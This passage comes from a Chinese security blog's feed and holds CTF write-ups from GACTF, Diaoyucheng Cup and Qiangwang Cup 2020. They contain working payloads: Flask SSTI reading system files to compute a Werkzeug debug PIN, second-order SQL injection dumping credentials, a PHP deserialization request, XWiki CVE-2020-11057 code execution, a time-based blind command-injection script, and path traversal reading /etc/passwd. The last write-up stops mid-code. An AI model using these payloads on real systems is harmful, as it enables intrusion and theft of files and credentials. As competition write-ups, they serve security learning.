class="string">"/etc/machine-id"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p>a8eb6cac33e701ae867269db5ce80e7f</p><p>新的machine-id要加上cgroup</p><p>于是读取/proc/self/cgroup并提取里面的id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">77</span>].__init__.__globals__[<span class="string">"__builtins__"</span>][<span class="string">"open"</span>](<span class="string">"/proc/self/cgroup"</span>).read()&#125;&#125;</div></pre></td></tr></table></figure><p>52833efbb53e157ffd26a035d647ff1a1902fe648113ae6b0799af212f1966d0</p><p>拼接</p><p>a8eb6cac33e701ae867269db5ce80e7f52833efbb53e157ffd26a035d647ff1a1902fe648113ae6b0799af212f1966d0</p><p>脚本来自kingkk师傅 (<a href="https://xz.aliyun.com/t/2553）" target="_blank" rel="external">https://xz.aliyun.com/t/2553）</a></p><p>得到pin码</p><p>742-613-872</p><p>进入debug模式，执行任意python代码</p><p><img src="http://pic.c1imber.top/blog/20200903/vs7HlRFgsaJ1.png?imageslim" alt="mark"></p><p>(需要花时间研究总结一下ssti了，姿势太多)</p><h3 id="carefuleyes"><a href="#carefuleyes" class="headerlink" title="carefuleyes"></a>carefuleyes</h3><p>下载www.zip进行代码审计</p><p>发现一处二次注入</p><p>在rename.php,在出库时没有对数据库当中的$result[‘filename’]进行转义</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$info = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$result['filename']&#125;'"</span>);</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200903/uyicsJ7uIJEC.png?imageslim" alt="mark"></p><p>可控输入：upload.php当中的<code>basename(pathinfo($_FILES[&quot;upfile&quot;][&#39;name&#39;]))[&#39;filename&#39;]</code>可以作为二次注入的注入点，这里转义入库，在出库时发生注入</p><p><img src="http://pic.c1imber.top/blog/20200903/XtdHAY1NRtd0.png?imageslim" alt="mark"></p><p>构造<code>filename=&quot;1&#39; and 1=2 union select 1,group_concat(username,0x3a,password),3,4,5 from user#.jpg&quot;</code></p><p><img src="http://pic.c1imber.top/blog/20200903/kss5lpAg8bqO.png?imageslim" alt="mark"></p><p>接着访问rename，在old filename处传入<code>1&#39; and 1=2 union select 1,group_concat(username,0x3a,password),3,4,5 from user#</code>，触发二次注入</p><p><img src="http://pic.c1imber.top/blog/20200903/Q17Ycr0fdunw.png?imageslim" alt="mark"></p><p>获得数据库username和password为XM和qweqweqwe</p><p>upload.php存在<code>unserialize($_GET[&quot;data&quot;]);</code>，构造payload触发这里的反序列化，获取flag</p><p>payload</p><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">XCTFGG</span></span>&#123;</div><div class="line">    <span class="keyword">private</span> $method;</div><div class="line">    <span class="keyword">private</span> $args;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;method = $method;</div><div class="line">        <span class="keyword">$this</span>-&gt;args = $args;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$userinfo=<span class="keyword">array</span>(<span class="string">"XM"</span>,<span class="string">"qweqweqwe"</span>);</div><div class="line">$obj=<span class="keyword">new</span> XCTFGG(<span class="string">"login"</span>,$userinfo);</div><div class="line"><span class="keyword">echo</span> serialize($obj);</div></pre></td></tr></table></figure><p>result:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">6</span>:<span class="string">"XCTFGG"</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">"XCTFGGmethod"</span>;s:<span class="number">5</span>:<span class="string">"login"</span>;s:<span class="number">12</span>:<span class="string">"XCTFGGargs"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">2</span>:<span class="string">"XM"</span>;i:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">"qweqweqwe"</span>;&#125;&#125;</div></pre></td></tr></table></figure><p>因为这里类的属性是private，当中有不可见字符，需要修改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:<span class="number">6</span>:<span class="string">"XCTFGG"</span>:<span class="number">2</span>:&#123;S:<span class="number">14</span>:<span class="string">"\00XCTFGG\00method"</span>;s:<span class="number">5</span>:<span class="string">"login"</span>;S:<span class="number">12</span>:<span class="string">"\00XCTFGG\00args"</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">2</span>:<span class="string">"XM"</span>;i:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">"qweqweqwe"</span>;&#125;&#125;</div></pre></td></tr></table></figure><p>最终构造上传数据包获取flag</p><pre><code>POST /upload.php?data=O%3A6%3A%22XCTFGG%22%3A2%3A%7BS%3A14%3A%22%5C00XCTFGG%5C00method%22%3Bs%3A5%3A%22login%22%3BS%3A12%3A%22%5C00XCTFGG%5C00args%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A%22XM%22%3Bi%3A1%3Bs%3A9%3A%22qweqweqwe%22%3B%7D%7D HTTP/1.1Host: 202.182.118.236User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------406950059833807422084179561779Content-Length: 228Origin: http://202.182.118.236Connection: closeReferer: http://202.182.118.236/Upgrade-Insecure-Requests: 1    -----------------------------406950059833807422084179561779Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;getflag.jpg&quot;Content-Type: image/jpeg    111-----------------------------406950059833807422084179561779--</code></pre><p><img src="http://pic.c1imber.top/blog/20200903/dBNtMGL6uSww.png?imageslim" alt="mark"></p><h3 id="XWiki"><a href="#XWiki" class="headerlink" title="XWiki"></a>XWiki</h3><p>CVE-2020-11057</p><p><a href="https://www.anquanke.com/vul/id/2024692" target="_blank" rel="external">https://www.anquanke.com/vul/id/2024692</a></p><p>根据漏洞描述，需要注册账号，然后在编辑个人仪表板的位置可以执行python或groovy代码</p><p>影响版本：</p><p>XWiki Platform 7.2版本至11.10.2版本</p><p>而目标为11.10.1</p><p><a href="http://119.3.111.133:1234/bin/edit/XWiki/Adm1nAdm1n?editor=inline&amp;category=dashboard" target="_blank" rel="external">http://119.3.111.133:1234/bin/edit/XWiki/Adm1nAdm1n?editor=inline&amp;category=dashboard</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">print</span> os.popen(<span class="string">'ls /'</span>).read()</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200903/9sU51BthkwiS.png?imageslim" alt="mark"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">print</span> os.popen(<span class="string">'/readflag'</span>).read()</div></pre></td></tr></table></figure><p>直接执行这个二进制文件不行，一直显示比较数字大小</p><p><img src="http://pic.c1imber.top/blog/20200903/WRrOU06HsHW1.png?imageslim" alt="mark"></p><p>写个交互</p><p>readflag.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</div><div class="line">p=Popen(<span class="string">"./readflag"</span>,stdin=PIPE,stdout=PIPE,stderr=PIPE)</div><div class="line"><span class="keyword">print</span> p.stdout.readline()</div><div class="line"><span class="keyword">print</span> p.stdout.readline()</div><div class="line">res=<span class="string">""</span></div><div class="line">s=p.stdout.readline()</div><div class="line"><span class="keyword">while</span> <span class="string">"Which number is bigger?"</span> <span class="keyword">in</span> s:</div><div class="line">    <span class="keyword">print</span> s</div><div class="line">    num0=int(s.split(<span class="string">':'</span>)[<span class="number">0</span>].split(<span class="string">'?'</span>)[<span class="number">1</span>])</div><div class="line">    num1=int(s.split(<span class="string">':'</span>)[<span class="number">1</span>])</div><div class="line">    <span class="keyword">if</span> num0&gt;num1:</div><div class="line">        p.stdin.write(<span class="string">'0\n'</span>)</div><div class="line">        res+=<span class="string">'0'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        p.stdin.write(<span class="string">'1\n'</span>)</div><div class="line">        res+=<span class="string">'1'</span></div><div class="line">    s=p.stdout.readline()</div><div class="line"></div><div class="line"><span class="keyword">print</span> res</div></pre></td></tr></table></figure><p>得到一串二进制字符串</p><p><img src="http://pic.c1imber.top/blog/20200903/Ch5y7143T0vX.png?imageslim" alt="mark"></p><p>转为字符串就是flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">"01100111011000010110001101110100011001100111101101011000010101110110100101101011011010010101111101000011010101100100010101011111011101110110100101110100011010000110111101110101011101000101111101110000011001010111001001101101011010010111001101110011011010010110111101101110010111110111001101100011011100100110100101110000011101000110100101101110011001110101111101100101011110000110010101100011011101010111010001101001011011110110111000100001001000010010000101111101"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>l=[s[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">8</span>)]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> [int(b, <span class="number">2</span>) <span class="keyword">for</span> b <span class="keyword">in</span> l]])</div></pre></td></tr></table></figure><p><code>gactf{XWiki_CVE_without_permission_scripting_execution!!!}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;EZFLASK&quot;&gt;&lt;a href=&quot;#EZFLASK&quot; class=&quot;headerlink&quot; title=&quot;EZFLASK&quot;&gt;&lt;/a&gt;EZFLASK&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://124.70.206.91:10001/&quot; target=&quot;_bla
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020钓鱼城杯writeup</title>
    <link href="https://c1aysec.github.io/2020/08/28/2020%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFwriteup/"/>
    <id>https://c1aysec.github.io/2020/08/28/2020钓鱼城杯writeup/</id>
    <published>2020-08-28T06:46:21.992Z</published>
    <updated>2020-08-28T06:59:34.941Z</updated>
    
    <content type="html"><![CDATA[<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>php命令执行无回显、不出网、web目录不可写</p><p>通过<code>php -r &quot;sleep(5)&quot;</code>延时可以判断命令执行成功</p><p>获取/flag.txt</p><p><code>cmd=php -r &quot;if(strlen(file_get_contents(&#39;/flag.txt&#39;))==25){sleep(5);}&quot;</code></p><p><img src="http://pic.c1imber.top/blog/20200828/n7eLgP9axiwK.png?imageslim" alt="mark"></p><p>时间盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">l=string.maketrans(<span class="string">""</span>,<span class="string">""</span>)[<span class="number">33</span>:<span class="number">127</span>]</div><div class="line"></div><div class="line">flag=<span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> l:</div><div class="line">        paramsPost = &#123;<span class="string">"cmd"</span>:<span class="string">"php -r \"if(substr((file_get_contents('/flag.txt')),%d,1)=='%s')&#123;sleep(5);&#125;\""</span>%(i,j)&#125;</div><div class="line">        headers = &#123;<span class="string">"Accept"</span>:<span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>,<span class="string">"Cache-Control"</span>:<span class="string">"no-cache"</span>,<span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,<span class="string">"User-Agent"</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span>,<span class="string">"Connection"</span>:<span class="string">"close"</span>,<span class="string">"Accept-Language"</span>:<span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,<span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,<span class="string">"Pragma"</span>:<span class="string">"no-cache"</span>,<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">        start=time.time()</div><div class="line">        response = requests.post(<span class="string">"http://119.3.37.185/index.php"</span>, data=paramsPost, headers=headers)</div><div class="line">        end=time.time()</div><div class="line">        <span class="keyword">if</span> end-start &gt;=<span class="number">5</span>:</div><div class="line">            flag+=j</div><div class="line">            <span class="keyword">print</span> flag</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20200828/dIPIfK9dyRyG.png?imageslim" alt="mark"></p><p><code>flag{kijbvstsbsnsj1d9bc8}</code></p><h3 id="easyseed"><a href="#easyseed" class="headerlink" title="easyseed"></a>easyseed</h3><p>index.bak泄露key和lock生成算法</p><p><img src="http://pic.c1imber.top/blog/20200828/PxlX4MDEwA8A.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$lock = random(<span class="number">6</span>, <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line">$key = random(<span class="number">16</span>, <span class="string">'1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'0123456789ABC'</span>)</span> </span>&#123;</div><div class="line">    $hash = <span class="string">''</span>;</div><div class="line">    $max = strlen($chars) - <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</div><div class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $hash;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>Set-Cookie里给出了lock的值</p><p><img src="http://pic.c1imber.top/blog/20200828/5kUp2V0dPSta.png?imageslim" alt="mark"></p><p>根据lock值爆破seed</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">str1=<span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span></div><div class="line">str2=<span class="string">'vEUHaY'</span></div><div class="line">str3 = str1[::<span class="number">-1</span>]</div><div class="line">length = len(str2)</div><div class="line">res=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</div><div class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</div><div class="line">            res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> res</div></pre></td></tr></table></figure><p>得到<code>21 21 0 51 30 30 0 51 46 46 0 51 33 33 0 51 0 0 0 51 50 50 0 51</code></p><p><code>./php_mt_seed 21 21 0 51 30 30 0 51 46 46 0 51 33 33 0 51 0 0 0 51 50 50 0 51</code></p><p>得到两个seed</p><p><img src="http://pic.c1imber.top/blog/20200828/Wgh5dVVX24cW.png?imageslim" alt="mark"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">mt_srand(<span class="number">718225</span>);</div><div class="line"><span class="comment">//mt_srand(4007230629);</span></div><div class="line">$lock = random(<span class="number">6</span>, <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line">$key = random(<span class="number">16</span>, <span class="string">'1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'0123456789ABC'</span>)</span> </span>&#123;</div><div class="line">    $hash = <span class="string">''</span>;</div><div class="line">    $max = strlen($chars) - <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</div><div class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $hash;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">echo</span> $lock;</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">echo</span> $key;</div><div class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</div></pre></td></tr></table></figure><p>选择正确的locl、key</p><p><code>lock=vEUHaY; key=nRtqGR8mtd9ZOPyI;</code></p><p>需要带上X-Forwarded-For: 127.0.0.1请求，才能获取flag==</p><p><img src="http://pic.c1imber.top/blog/20200828/21dIhUgOR2Kz.png?imageslim" alt="mark"></p><h3 id="zblog（完全是队友们做出来的）"><a href="#zblog（完全是队友们做出来的）" class="headerlink" title="zblog（完全是队友们做出来的）"></a>zblog（完全是队友们做出来的）</h3><p><img src="http://pic.c1imber.top/blog/20200828/Cs7pUhq9chBj.png?imageslim" alt="mark"></p><p>发现title存在任意文件读取</p><p><code>http://122.112.253.135/?title=/../../../../../../../etc/passwd</code></p><p><img src="http://pic.c1imber.top/blog/20200828/2HHUGR8gjkma.png?imageslim" alt="mark"></p><p>尝试读取/flag、/flag.txt均不行。读取/proc/self目录下的文件</p><p>从其他师傅博客里看到的fuzz字典：</p><pre><code>/proc/self/cmdline/proc/self/stat/proc/self/status/proc/self/environ/proc/verison/proc/cmdline/proc/self/cwd/proc/self/fd/0/proc/self/fd/1/proc/self/fd/2/proc/self/fd/3/proc/self/fd/4/proc/self/fd/5/proc/self/fd/6/proc/self/fd/7/proc/self/fd/8/proc/self/fd/9/proc/self/fd/10/proc/self/fd/11/proc/self/fd/12/proc/self/fd/13/proc/self/fd/14/proc/self/fd/15/proc/self/fd/16/proc/self/fd/17/proc/self/fd/18/proc/self/fd/19/proc/self/fd/20/proc/self/fd/21/proc/self/fd/22/proc/self/fd/23/proc/self/fd/24/proc/self/fd/25/proc/self/fd/26/proc/self/fd/27/proc/self/fd/28/proc/self/fd/29/proc/self/fd/30/proc/self/fd/31/proc/self/fd/32/proc/self/fd/33/proc/self/fd/34/proc/self/fd/35/proc/sched_debug/proc/mounts/proc/net/arp/proc/net/route/proc/net/tcp/proc/net/udp/proc/net/fib_trie/proc/version</code></pre><p>在/proc/self/cmdline发现当前运行的web jar包</p><p><img src="http://pic.c1imber.top/blog/20200828/ja16S1KRHrQC.png?imageslim" alt="mark"></p><p>/home/ctf/web/target/web-1.0-SNAPSHOT-jar-with-dependencies.jar</p><p>但是下载不下来</p><p>后来发现了关键的源码</p><p>/home/ctf/web/src/main/java/Blog.java</p><p><img src="http://pic.c1imber.top/blog/20200828/EpFBv1kxesTb.png?imageslim" alt="mark"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">static</span> spark.Spark.*;</div><div class="line"><span class="keyword">import</span> java.io.*;</div><div class="line"><span class="keyword">import</span> org.apache.velocity.Template;</div><div class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</div><div class="line"><span class="keyword">import</span> org.apache.velocity.app.VelocityEngine;</div><div class="line"><span class="keyword">import</span> spark.template.velocity.VelocityTemplateEngine;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">import</span> java.io.StringWriter;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Blog</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String fname, String content)</span> </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            FileWriter writer = <span class="keyword">new</span> FileWriter(fname, <span class="keyword">true</span>);</div><div class="line">            writer.write(content);</div><div class="line">            writer.close();</div><div class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] arg)</span> </span>&#123;</div><div class="line">        staticFiles.location(<span class="string">"/public"</span>);</div><div class="line"></div><div class="line">        VelocityEngine velocityEngine = <span class="keyword">new</span> VelocityEngine();</div><div class="line">        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, <span class="string">"file"</span>);</div><div class="line">        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, <span class="string">"/"</span>);</div><div class="line">        velocityEngine.init();</div><div class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</div><div class="line"></div><div class="line">        get(<span class="string">"/"</span>, (request, response) -&gt; &#123;</div><div class="line">            request.session(<span class="keyword">true</span>);</div><div class="line">            String title = request.queryParams(<span class="string">"title"</span>);</div><div class="line">            <span class="keyword">if</span> (title != <span class="keyword">null</span>) &#123;</div><div class="line">                log(<span class="string">"/tmp/"</span> + request.session().id(), <span class="string">"Client IP: "</span> + request.ip() + <span class="string">" -&gt; File: "</span> + title + <span class="string">"\n"</span>);</div><div class="line">                Template template = velocityEngine.getTemplate(<span class="string">"/home/ctf/web/src/main/resources/templates/"</span> + title);</div><div class="line">                StringWriter sw = <span class="keyword">new</span> StringWriter();</div><div class="line">                template.merge(context, sw);</div><div class="line">                <span class="keyword">return</span> sw;</div><div class="line">            &#125;</div><div class="line">            Template template = velocityEngine.getTemplate(<span class="string">"/home/ctf/web/src/main/resources/templates/index"</span>);</div><div class="line">            StringWriter sw = <span class="keyword">new</span> StringWriter();</div><div class="line">            template.merge(context, sw);</div><div class="line">            <span class="keyword">return</span> sw;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>X-Forwarded-For头的位置存在ssti</p><p><img src="http://pic.c1imber.top/blog/20200828/1s9kmIDPRPrN.png?imageslim" alt="mark"></p><p>可以直接rce，直接用solr那个rce payload就可以成功</p><p><img src="http://pic.c1imber.top/blog/20200828/bj7HD4Yma9aM.png?imageslim" alt="mark"></p><p>获取flag</p><p><img src="http://pic.c1imber.top/blog/20200828/y95IWbp35WRC.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;easyweb&quot;&gt;&lt;a href=&quot;#easyweb&quot; class=&quot;headerlink&quot; title=&quot;easyweb&quot;&gt;&lt;/a&gt;easyweb&lt;/h3&gt;&lt;p&gt;php命令执行无回显、不出网、web目录不可写&lt;/p&gt;
&lt;p&gt;通过&lt;code&gt;php -r &amp;quo
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020强网杯writeup</title>
    <link href="https://c1aysec.github.io/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AFwriteup/"/>
    <id>https://c1aysec.github.io/2020/08/24/2020强网杯writeup/</id>
    <published>2020-08-24T08:28:12.524Z</published>
    <updated>2020-08-25T09:41:40.579Z</updated>
    
    <content type="html"><![CDATA[<p>没做出几道题，记录一下吧，周末两天的做题还是有收获的</p><h1 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h1><h3 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h3><p><img src="http://pic.c1imber.top/blog/20200824/7xfowRDckelN.png?imageslim" alt="mark"></p><p>题目直接给了源码</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">@error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">require_once</span> <span class="string">"common.php"</span>;</div><div class="line"><span class="keyword">require_once</span> <span class="string">"class.php"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</div><div class="line">$username = $_GET[<span class="string">'username'</span>];</div><div class="line">$password = $_GET[<span class="string">'password'</span>];</div><div class="line">$player = <span class="keyword">new</span> player($username, $password);</div><div class="line">file_put_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]), write(serialize($player))); </div><div class="line"><span class="keyword">echo</span> sprintf(<span class="string">'Welcome %s, your ip is %s\n'</span>, $username, $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Please input the username or password!\n"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>play.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div 